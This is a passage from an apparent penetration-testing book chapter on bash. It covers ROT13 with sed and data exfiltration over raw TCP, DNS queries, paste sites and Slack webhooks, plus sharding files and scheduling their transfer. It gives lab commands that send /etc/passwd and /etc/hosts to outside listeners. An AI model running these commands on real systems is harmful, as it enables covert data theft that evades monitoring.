<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 12-1: Rotated characters in</span> <span class="SANS_Futura_Std_Book_11">No Starch Press</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">In a bash script, <span class="SANS_TheSansMonoCd_W5Regular_11">sed</span> provides an easy way to replace letters in a string with others. Consider the command in <a href="chapter12.xhtml#Lis12-25">Listing 12-25</a>.</p>&#13;
<span id="Lis12-25"/><pre><code>$ <b>echo "No Starch Press" | sed 'y/abcdefghijklmnopqrstuvwxyzABCDEFGHIJK</b>&#13;
<b>LMNOPQRSTUVWXYZ/nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM/'</b>&#13;
&#13;
Ab Fgnepu Cerff&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-25: Performing ROT13 encryption with sed</span></p>&#13;
<p class="TX">We use <span class="SANS_TheSansMonoCd_W5Regular_11">sed</span> with the transliteration option (<span class="SANS_TheSansMonoCd_W5Regular_11">y</span>) to tell the tool to replace the source characters with the destination characters. This requires the source pattern to have the same number of characters as the destination pattern. In this case, we supply the entire alphabet in lowercase- and uppercase, along with the rotated characters.</p>&#13;
<p class="TX">To rotate the characters back to their original form, simply swap the location of the patterns so that the destination pattern becomes the source (<a href="chapter12.xhtml#Lis12-26">Listing 12-26</a>).</p>&#13;
<span id="Lis12-26"/><pre><code>$ <b>echo "Ab Fgnepu Cerff" | sed 'y/nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABC</b>&#13;
<b>DEFGHIJKLM/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/'</b>&#13;
&#13;
No Starch Press&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-26: Decrypting ROT13 with sed</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_300" aria-label="300"/>Try incorporating this encryption logic into a larger bash script. Here are a few ideas:</p>&#13;
<ul class="ul">&#13;
<li class="ListBullet">Accept a string as input from a user and allow them to decide whether to encrypt or decrypt the string.</li>&#13;
<li class="ListBullet">Allow the user to choose which rotation algorithm to use. You don’t have to rotate the characters 13 times. Why not try 20 times?</li>&#13;
<li class="ListBullet">Use what you learned in <span class="listbullet_Xref">“Encryption” on <a href="#pg_298">page 298</a></span> to combine the substitution cipher with other encryption schemes. For example, accept text input from the user running the script, rotate its characters, then encrypt it. To retrieve the original message, perform the inverse operations.</li>&#13;
</ul>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec18">&#13;
<h2 class="H1" id="sec18"><span id="h1-106"/><span class="SANS_Futura_Std_Bold_B_11">Exfiltration</span></h2>&#13;
<p class="TNI1">Once an attacker gains access to pertinent information, they must transmit the data from the network while staying covert. We call this task <i>exfiltration</i>. Enterprise security software looks for signs of data exfiltration in various ways, but attackers have come up with creative approaches to make the process less obvious. We’ll cover a few exfiltration strategies in this section.</p>&#13;
<section epub:type="division" aria-labelledby="sec19">&#13;
<h3 class="H2" id="sec19"><span id="h2-179"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Raw TCP</span></h3>&#13;
<p class="TNI1">In earlier chapters, we sent data over raw TCP connections by using tools such as Ncat, Netcat, and socat. By using the data concealment techniques covered in this chapter thus far, we can disguise this data before transmitting it.</p>&#13;
<p class="TX">For example, before sending the contents of the <i>/etc/passwd</i> file over TCP, we can convert the ASCII data to hexadecimal by using <span class="SANS_TheSansMonoCd_W5Regular_11">xxd</span>. To receive this data, we’ll set up a socat TCP listener on Kali. Run the command in <a href="chapter12.xhtml#Lis12-27">Listing 12-27</a> to start the listener.</p>&#13;
<span id="Lis12-27"/><pre><code>$ <b>socat TCP-LISTEN:12345,reuseaddr,fork - | xxd -r -p</b></code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-27: Creating a TCP listener that decodes hexadecimal data</span></p>&#13;
<p class="TX">socat will listen on port 12345/TCP and pipe the raw data to <span class="SANS_TheSansMonoCd_W5Regular_11">xxd</span> to convert the hexadecimal to readable text.</p>&#13;
<p class="TX">Next, we’ll transmit the content of the file in hexadecimal by using <span class="SANS_TheSansMonoCd_W5Regular_11">nc</span>. Run the command in <a href="chapter12.xhtml#Lis12-28">Listing 12-28</a> on any of the lab machines, such as <i>p-jumpbox-01</i> (172.16.10.13).</p>&#13;
<span id="Lis12-28"/><pre><code>$ <b>xxd -p /etc/passwd | nc 172.16.10.1 12345</b></code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-28: Encoding a file’s data before transmitting it over TCP</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_301" aria-label="301"/>In your listener, you should see the decoded contents of <i>/etc/passwd</i>:</p>&#13;
<pre><code>socat TCP-LISTEN:12345,reuseaddr,fork - | xxd -r -p&#13;
&#13;
root:x:0:0:root:/root:/bin/bash&#13;
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&#13;
bin:x:2:2:bin:/bin:/usr/sbin/nologin&#13;
sys:x:3:3:sys:/dev:/usr/sbin/nologin&#13;
sync:x:4:65534:sync:/bin:/bin/sync&#13;
games:x:5:60:games:/usr/games:/usr/sbin/nologin&#13;
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin&#13;
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&#13;
<var>--snip--</var>&#13;
</code></pre>&#13;
<p class="TX">You could further improve this exfiltration method by setting up both sides of the connection to use SSL to establish an encrypted exfiltration channel, as you did in <span class="Xref"><a href="chapter7.xhtml">Chapter 7</a></span>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec20">&#13;
<h3 class="H2" id="sec20"><span id="h2-180"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">DNS</span></h3>&#13;
<p class="TNI1">The DNS protocol is often a useful method for data exfiltration because it’s rarely blocked or monitored. We could covertly transfer data from a network to an external DNS server that we operate, then monitor it to capture all incoming queries.</p>&#13;
<p class="TX">For penetration-testing purposes, we could set up a quick-and-dirty DNS server such as dnserver (<i><a href="https://github.com/samuelcolvin/dnserver">https://github.com/samuelcolvin/dnserver</a></i>), but in this example, we’ll use DNSChef (<i><a href="https://github.com/iphelix/dnschef">https://github.com/iphelix/dnschef</a></i>), a Python-based DNS proxy, to capture incoming queries. DNSChef should be available in Kali via the <span class="SANS_TheSansMonoCd_W5Regular_11">dnschef</span> command.</p>&#13;
<p class="TX">First, let’s start the DNSChef server with a few specific flags. These configure the server to provide fake query resolutions to specific domains:</p>&#13;
<pre><code>$ <b>sudo dnschef \</b>&#13;
<b>  --fakedomains blackhatbash.com \</b>&#13;
<b>  --fakeip 127.0.0.1 --interface 0.0.0.0 \</b>&#13;
<b>  --logfile dnschef.log</b>&#13;
</code></pre>&#13;
<p class="TX">We pass <span class="SANS_TheSansMonoCd_W5Regular_11">--fakedomains blackhatbash.com</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">--fakeip 127.0.0.1</span> to resolve any incoming queries to the <i>blackhatbash.com</i> domain to the IP address 127.0.0.1 (localhost). We then pass <span class="SANS_TheSansMonoCd_W5Regular_11">--interface 0.0.0.0</span> to ensure that DNSChef responds to all incoming queries on all interfaces. Next, we specify <span class="SANS_TheSansMonoCd_W5Regular_11">--logfile dnschef.log</span> to write the runtime output to a file.</p>&#13;
<p class="TX">Now that the DNS server is running, it can serve DNS queries. Use any of the lab machines to run the command in <a href="chapter12.xhtml#Lis12-29">Listing 12-29</a>.</p>&#13;
<span id="Lis12-29"/><pre><code>$ <b>for i in $(xxd -p -c 30 /etc/passwd); do dig $i.blackhatbash.com @172.16.10.1; done</b></code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-29: Exfiltrating the contents of a file via DNS</span></p>&#13;
<p class="TX">We run a <span class="SANS_TheSansMonoCd_W5Regular_11">for</span> loop on the output of <span class="SANS_TheSansMonoCd_W5Regular_11">xxd -p -c 30 /etc/passwd</span>, which will convert ASCII to hexadecimal. We then run the <span class="SANS_TheSansMonoCd_W5Regular_11">dig</span> command to perform a lookup on the entire domain, including the newly generated hexadecimal <span role="doc-pagebreak" epub:type="pagebreak" id="pg_302" aria-label="302"/>subdomains. We use <span class="SANS_TheSansMonoCd_W5Regular_11">@172.16.10.1</span> to tell <span class="SANS_TheSansMonoCd_W5Regular_11">dig</span> which DNS server to use for DNS resolution, providing the Kali IP address on which DNSChef is running.</p>&#13;
<p class="TX">After the command executes, you should see output similar to the following in DNSChef:</p>&#13;
<pre><code>23:51:22) [*] DNSChef started on interface: 0.0.0.0&#13;
<var>--snip--</var>&#13;
(23:51:22) [*] Cooking A replies to point to 127.0.0.1 matching: blackhatbash.com&#13;
(23:51:22) [*] DNSChef is active.&#13;
(23:52:08) [*] 172.16.10.13: cooking the response of type 'A'&#13;
for 726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173.blackhatbash.com to 127.0.0.1&#13;
(23:52:08) [*] 172.16.10.13: cooking the response of type 'A'&#13;
for 680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f736269.blackhatbash.com to 127.0.0.1&#13;
(23:52:08) [*] 172.16.10.13: cooking the response of type 'A'&#13;
for 6e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a.blackhatbash.com to 127.0.0.1&#13;
<var>--snip--</var>&#13;
</code></pre>&#13;
<p class="TX">The loop made a DNS query for each ASCII-to-hexadecimal conversion, using the data as a subdomain of <i>blackhatbash.com</i>. Pick any of the lines from the output and pipe it to <span class="SANS_TheSansMonoCd_W5Regular_11">xxd</span> to convert it from hexadecimal:</p>&#13;
<pre><code>$ <b>echo 726f6f743a783a303a303a726f6f743a2f726f6f74.blackhatbash.com | xxd -r -p</b>&#13;
&#13;
root:x:0:0:root:/root:/bin/bash&#13;
</code></pre>&#13;
<p class="TX">To convert all the subdomains at once, you can use a few <span class="SANS_TheSansMonoCd_W5Regular_11">sed</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">awk</span> tricks (<a href="chapter12.xhtml#Lis12-30">Listing 12-30</a>).</p>&#13;
<span id="Lis12-30"/><pre><code>$ <b>sed -n 's/.*for \(.*\) to .*/\1/p' dnschef.log  | awk -F'.' '{print $1}' | xxd -r -p</b></code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-30: Parsing and converting queried subdomains to reconstruct the exfiltrated data</span></p>&#13;
<p class="TX">We use <span class="SANS_TheSansMonoCd_W5Regular_11">sed -n</span> (quiet mode) with a regular expression pattern to extract the text between the word <span class="SANS_TheSansMonoCd_W5Regular_11">for</span> and the word <span class="SANS_TheSansMonoCd_W5Regular_11">to</span> in DNSChef’s output, which should give us the full domain. We then use <span class="SANS_TheSansMonoCd_W5Regular_11">awk</span> to filter out only the subdomain portion and pipe this to <span class="SANS_TheSansMonoCd_W5Regular_11">xxd -r -p</span> to convert it to ASCII.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec21">&#13;
<h3 class="H2" id="sec21"><span id="h2-181"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Text Storage Sites</span></h3>&#13;
<p class="TNI1">Text storage sites like the popular <i><a href="https://pastebin.com">https://pastebin.com</a></i> are another way of getting data out of a network. Let’s practice working with Sprunge, an open source project hosted at <i><a href="https://github.com/rupa/sprunge">https://github.com/rupa/sprunge</a></i>. You can clone the repository and host it on a server or use the application hosted on the <i><a href="https://sprunge.us">https://sprunge.us</a></i> online service.</p>&#13;
<p class="TX">To post to Sprunge, use the following syntax:</p>&#13;
<pre><code><var>some-command</var> | curl -F 'sprunge=&lt;-' http:<var>//my-custom-sprunge-server.local</var></code></pre>&#13;
<p class="TX">We pipe a command to <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> to make a POST request using form data (<span class="SANS_TheSansMonoCd_W5Regular_11">-F</span>). The <span class="SANS_TheSansMonoCd_W5Regular_11">sprunge=&lt;-</span> syntax basically assigns standard input to the field <span class="SANS_TheSansMonoCd_W5Regular_11">sprunge</span>. In this case, standard input will include the piped command.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_303" aria-label="303"/>As shown in <a href="chapter12.xhtml#Lis12-31">Listing 12-31</a>, the command should output a short URL containing the posted content.</p>&#13;
<span id="Lis12-31"/><pre><code>$ <b>echo "Black Hat Bash" | curl -F 'sprunge=&lt;-' http:</b><b><var>//my-custom-sprunge-server.local</var></b>&#13;
http:<var>//my-custom-sprunge-server.local/7gWETD</var>&#13;
&#13;
$ <b>curl http:</b><b><var>//my-custom-sprunge-server.local/7gWETD</var></b>&#13;
Black Hat Bash&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-31: Uploading content to Sprunge and then fetching it</span></p>&#13;
<p class="TX">The site dpaste (<i><a href="https://dpaste.com">https://dpaste.com</a></i>) allows users to upload content by using their API. Its syntax is almost the same as Sprunge’s:</p>&#13;
<pre><code>$ <b>echo "Black Hat Bash" | curl -F "content=&lt;-" https://dpaste.com/api/v2/</b></code></pre>&#13;
<p class="TX">The command should output a URL such as <i>https://dpaste.com/AADSCMQ4W</i>. To fetch the uploaded content in raw text form, append <i>.txt</i> to the URL, like so: <i>https://dpaste.com/AADSCMQ4W.txt</i>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec22">&#13;
<h3 class="H2" id="sec22"><span id="h2-182"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Slack Webhooks</span></h3>&#13;
<p class="TNI1">A <i>webhook</i> provides a way for one system to send real-time data to another system when a specific event occurs. In simple terms, it functions like a notification mechanism between services. Popular applications such as Slack, Discord, Telegram, and Microsoft Teams provide webhooks as a way for other applications to send them messages. Those messages then appear in specific channels.</p>&#13;
<p class="TX">Penetration testers could use Slack webhooks to receive notifications about interesting events, such as the discovery of a new vulnerability. Attackers also use webhooks as exfiltration endpoints because corporate environments often allow messaging systems such as Slack or Microsoft Teams.</p>&#13;
<p class="TX">For example, to send the contents of the <i>/etc/hosts</i> file through a Slack webhook, you might write something like <a href="chapter12.xhtml#Lis12-32">Listing 12-32</a>.</p>&#13;
<span id="Lis12-32"/><pre><code>$ <b>curl -X POST -H 'Content-type: application/json' -d "{\"text\":\"$(cat</b>&#13;
<b>/etc/hosts)\"}" https://hooks.slack.com/services/some/hook</b>&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-32: Exfiltrating the contents of a file via a Slack webhook</span></p>&#13;
<p class="TX">On Slack, this information might look as shown in <a href="chapter12.xhtml#fig12-2">Figure 12-2</a>.</p>&#13;
<figure class="IMG"><img id="fig12-2" class="img7" src="../images/pg303.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 12-2: A Slack webhook message sent using bash</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_304" aria-label="304"/>As you can see, webhooks are essentially just HTTP endpoints that take an action when data is sent to them (in this case, posting the data to a channel). While not much different from the text storage sites we’ve covered, their parent domains (such as <i>slack.com</i> and <i>discord.com</i>) are less likely to be blocked.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec23">&#13;
<h2 class="H1" id="sec23"><span id="h1-107"/><span class="SANS_Futura_Std_Bold_B_11">Sharding Files</span></h2>&#13;
<p class="TNI1">Exfiltrated files can be large, and network security controls may sometimes flag connections that are transporting large amounts of data as suspicious. To accommodate this, we can <i>shard</i> files to create several smaller files. Let’s explore several sharding strategies. On Kali, create a file with 1,000 lines:</p>&#13;
<pre><code>$ <b>for line in $(seq 1 1000); do echo "line number ${line}"; done &gt;&gt; 1000_line_file.txt</b></code></pre>&#13;
<p class="TX">Next, check that the file contains exactly 1,000 lines by running <span class="SANS_TheSansMonoCd_W7Bold_B_11">wc -l 1000_line_file.txt</span>.</p>&#13;
<section epub:type="division" aria-labelledby="sec24">&#13;
<h3 class="H2" id="sec24"><span id="h2-183"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Number of Lines</span></h3>&#13;
<p class="TNI1">Using the <span class="SANS_TheSansMonoCd_W5Regular_11">split</span> command, we can split files into multiple files with a fixed number of lines. For example, splitting the <i>1000_line_file.txt</i> file by 500 would produce two files, each with 500 lines (<a href="chapter12.xhtml#Lis12-33">Listing 12-33</a>).</p>&#13;
<span id="Lis12-33"/><pre><code>$ <b>split -l 500 -d --verbose 1000_line_file.txt</b>&#13;
&#13;
creating file 'x00'&#13;
creating file 'x01'&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-33: Splitting a file into 500-line chunks</span></p>&#13;
<p class="TX">The split creates two files named <i>x00</i> and <i>x01</i>. The number at the end of the filename increments depending on the number of files generated. To check the length of each file, run <span class="SANS_TheSansMonoCd_W7Bold_B_11">wc -l x00 x01</span>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec25">&#13;
<h3 class="H2" id="sec25"><span id="h2-184"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Size</span></h3>&#13;
<p class="TNI1">We can also split files by specifying a size. For example, we could break a 10MB file into ten 1MB files by passing the <span class="SANS_TheSansMonoCd_W5Regular_11">--bytes</span> parameter to <span class="SANS_TheSansMonoCd_W5Regular_11">split</span> with the number of bytes to split by.</p>&#13;
<p class="TX">The <i>1000_line_file.txt</i> file size is exactly 15,893 bytes. Let’s split it into files of 5,000 bytes (<a href="chapter12.xhtml#Lis12-34">Listing 12-34</a>).</p>&#13;
<span id="Lis12-34"/><pre><code>$ <b>split -d --verbose --bytes=5000 1000_line_file.txt</b>&#13;
&#13;
creating file 'x00'&#13;
creating file 'x01'&#13;
creating file 'x02'&#13;
creating file 'x03'&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-34: Splitting a file into 5,000-byte chunks</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_305" aria-label="305"/>Next, check the size of each new file:</p>&#13;
<pre><code>$ <b>ls -l x0*</b>&#13;
&#13;
-rw-r--r-- 1 kali kali 5000 Dec  9 22:56 x00&#13;
-rw-r--r-- 1 kali kali 5000 Dec  9 22:56 x01&#13;
-rw-r--r-- 1 kali kali 5000 Dec  9 22:56 x02&#13;
-rw-r--r-- 1 kali kali  893 Dec  9 22:56 x03&#13;
</code></pre>&#13;
<p class="TX">As you can see, we produced four files. Three are exactly 5,000 bytes long, and the fourth contains the remaining data.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec26">&#13;
<h3 class="H2" id="sec26"><span id="h2-185"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Chunks</span></h3>&#13;
<p class="TNI1">Rather than splitting a file by size or by number of lines, we can split it into chunks of equal size with the <span class="SANS_TheSansMonoCd_W5Regular_11">--number</span> parameter. For example, <a href="chapter12.xhtml#Lis12-35">Listing 12-35</a> splits a file into 10 individual files.</p>&#13;
<span id="Lis12-35"/><pre><code>$ <b>split -d --verbose --number=10 1000_line_file.txt</b>&#13;
creating file 'x00'&#13;
creating file 'x01'&#13;
<var>--snip--</var>&#13;
creating file 'x08'&#13;
creating file 'x09'&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-35: Splitting a file into 10 chunks</span></p>&#13;
<p class="TX">The sharding method you choose is ultimately up to you, and each has pros and cons. If you shard a file into too many pieces, you may need to make many network calls that are complicated to reassemble them on the receiving end. However, sharding to just a few large files could trigger detections. Look for a balance that makes sense for your context.</p>&#13;
<p class="HeadAExercise"><span id="exe-29"/><span class="SANS_Futura_Std_Heavy_B_15">Exercise 29: Sharding and Scheduling Exfiltration</span></p>&#13;
<p class="TNI1">In this exercise, you’ll exfiltrate files by using two techniques: sharding the files, then scheduling each shard to be sent at a different time so they don’t raise suspicion.</p>&#13;
<p class="TX">Start a listener on port 12345/TCP in Kali:</p>&#13;
<pre><code>$ <b>socat TCP-LISTEN:12345,reuseaddr,fork -</b></code></pre>&#13;
<p class="TX">Then, run the commands shown in <a href="chapter12.xhtml#Lis12-36">Listing 12-36</a> in <i>p-jumpbox-01</i> (172.16.10.13).</p>&#13;
<span id="Lis12-36"/><pre><code>$ <b>cd /tmp</b>&#13;
$ <span class="Code_CodeAnnotation" aria-label="annotation1">❶</span> <b>for file in $(split /etc/passwd -l 5 -d --verbose); do </b><span class="Code_CodeAnnotation" aria-label="annotation2">❷</span><b> for prefix</b>&#13;
<b>in $(echo "${file}" | awk '{print $NF}' | grep -o '[0-9]*'); do </b><span class="Code_CodeAnnotation" aria-label="annotation3">❸</span><b> echo</b>&#13;
<b>"cat /tmp/x${prefix} | nc 172.16.10.1 12345" | at now "+${prefix}</b>&#13;
<b>minutes"; done; done</b>&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-36: Sharding a file and scheduling it for exfiltration</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_306" aria-label="306"/>We convert <i>/etc/passwd</i> into several five-line files, then use a <span class="SANS_TheSansMonoCd_W5Regular_11">for</span> loop to iterate over the files <span class="CodeAnnotation" aria-label="annotation1">❶</span>. Another <span class="SANS_TheSansMonoCd_W5Regular_11">for</span> loop <span class="CodeAnnotation" aria-label="annotation2">❷</span> extracts each file’s number (such as <i>00</i>, <i>01</i>, or <i>02</i>) from its filename. At <span class="CodeAnnotation" aria-label="annotation3">❸</span>, we pipe a command to the At task scheduler to send each file to the listener. We schedule the command to run in the number of minutes extracted from the suffix.</p>&#13;
<p class="TX">The listener should start receiving data within a few minutes. You’ll have fully rebuilt the <i>/etc/passwd</i> file after all the jobs have executed. To check the created At jobs, use the <span class="SANS_TheSansMonoCd_W7Bold_B_11">atq</span> command. Note that your job IDs will likely differ:</p>&#13;
<pre><code>$ <b>atq</b>&#13;
44    Sun Dec 10 04:12:00 a root&#13;
43    Sun Dec 10 04:11:00 a root&#13;
45    Sun Dec 10 04:13:00 a root&#13;
46    Sun Dec 10 04:14:00 a root&#13;
47    Sun Dec 10 04:15:00 a root&#13;
</code></pre>&#13;
<p class="TX">To improve this exercise, schedule the job by using a less predictable interval. Keep in mind, however, that the order of the files matters; their contents should make sense when you receive them.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec27">&#13;
<h2 class="H1" id="sec27"><span id="h1-108"/><span class="SANS_Futura_Std_Bold_B_11">Summary</span></h2>&#13;
<p class="TNI1">In this chapter, you learned about security controls, then wrote a script to detect security software on a system. You also learned techniques to masquerade and hide processes, as well as preload malicious shared libraries. You tampered with the metadata of login sessions and performed data exfiltration by using a variety of protocols and techniques.</p>&#13;
<p class="TX">You’ve now reached the pinnacle of an exhilarating bash hacking journey. You’ve mastered scripting basics, performed advanced text-processing tricks, and built automated tools to exploit vulnerable services. This formidable skill set should equip you for all your future ethical hacking engagements.</p>&#13;
<p class="TX">To take your offensive bash skills to the next level, we encourage you to explore hacking tools not covered in this book and leverage bash to integrate them into your custom hacking pipeline. After all, the best way to learn new scripting techniques is to begin with an idea and challenge yourself to implement it. Good luck!</p>&#13;
</section>&#13;
</section>&#13;
</body></html>